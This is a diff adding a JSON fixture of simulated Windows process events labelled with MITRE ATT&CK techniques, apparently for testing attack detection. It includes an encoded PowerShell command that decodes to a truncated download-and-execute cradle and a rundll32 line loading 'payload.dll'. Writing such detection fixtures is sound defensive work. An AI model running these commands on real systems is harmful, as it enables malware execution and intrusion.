@@ -1,0 +1,42 @@
+﻿[
+  {
+    "_comment": "T1059.001 - powershell.exe -enc (parent: explorer)",
+    "timestamp": 1700100000.0,
+    "event_type": "ProcessCreate",
+    "pid": 5000,
+    "ppid": 400,
+    "image_path": "C:\\Windows\\System32\\explorer.exe",
+    "command_line": "explorer.exe",
+    "details": {}
+  },
+  {
+    "_comment": "T1059.001 - powershell.exe -enc (child of explorer)",
+    "timestamp": 1700100005.0,
+    "event_type": "ProcessCreate",
+    "pid": 5100,
+    "ppid": 5000,
+    "image_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "command_line": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8A",
+    "details": {}
+  },
+  {
+    "_comment": "T1218.011 - rundll32 unusual DLL (child of powershell)",
+    "timestamp": 1700100010.0,
+    "event_type": "ProcessCreate",
+    "pid": 5200,
+    "ppid": 5100,
+    "image_path": "C:\\Windows\\System32\\rundll32.exe",
+    "command_line": "rundll32.exe C:\\Users\\Public\\Downloads\\payload.dll,DllMain",
+    "details": {}
+  },
+  {
+    "_comment": "T1047 - WMI lateral exec (child of rundll32)",
+    "timestamp": 1700100015.0,
+    "event_type": "ProcessCreate",
+    "pid": 5300,
+    "ppid": 5200,
+    "image_path": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
+    "command_line": "WmiPrvSE.exe -secured -Embedding",
+    "details": {}
+  }
+]
